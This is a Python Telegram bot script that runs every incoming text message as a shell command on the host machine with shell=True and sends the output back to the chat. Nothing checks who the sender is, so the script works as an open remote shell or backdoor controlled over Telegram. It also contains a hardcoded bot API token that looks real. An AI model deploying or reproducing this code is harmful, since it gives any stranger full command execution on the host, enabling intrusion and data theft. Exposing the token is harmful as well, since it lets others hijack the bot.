import logging
import subprocess
import os
from telegram import Update
from telegram.ext import filters, MessageHandler, ApplicationBuilder, CommandHandler, ContextTypes

# Ensure the required module is installed
try:
    import telegram
    from telegram.ext import filters, MessageHandler, ApplicationBuilder, CommandHandler, ContextTypes
except ImportError:
    subprocess.check_call(["pip", "install", "python-telegram-bot"])

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Initialize the current working directory
current_directory = os.getcwd()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_message(chat_id=update.effective_chat.id, text="I am your bot")

async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_directory
    try:
        command = update.message.text.strip()

        if command.startswith('ls'):
            output = subprocess.check_output(command, cwd=current_directory, shell=True).decode('utf-8')
            await context.bot.send_message(chat_id=update.effective_chat.id, text=output)

        elif command.startswith('cd'):
            new_directory = command[3:].strip()
            os.chdir(new_directory)
            current_directory = os.getcwd()
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Changed directory to {current_directory}")

        elif command == 'pwd':
            await context.bot.send_message(chat_id=update.effective_chat.id, text=current_directory)

        else:
            output = subprocess.check_output(command, cwd=current_directory, shell=True).decode('utf-8')
            await context.bot.send_message(chat_id=update.effective_chat.id, text=output if output else 'no output')

    except subprocess.CalledProcessError as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

if __name__ == '__main__':
    # API Key goes here
    application = ApplicationBuilder().token('7242021997:AAFWX2-ve9YfLYh4z1mxVazGf798OoPHxG4').build()

    # starting the function
    echo_handler = MessageHandler(filters.TEXT & (~filters.COMMAND), echo)
    start_handler = CommandHandler('start', start)

    application.add_handler(start_handler)
    application.add_handler(echo_handler)

    application.run_polling()
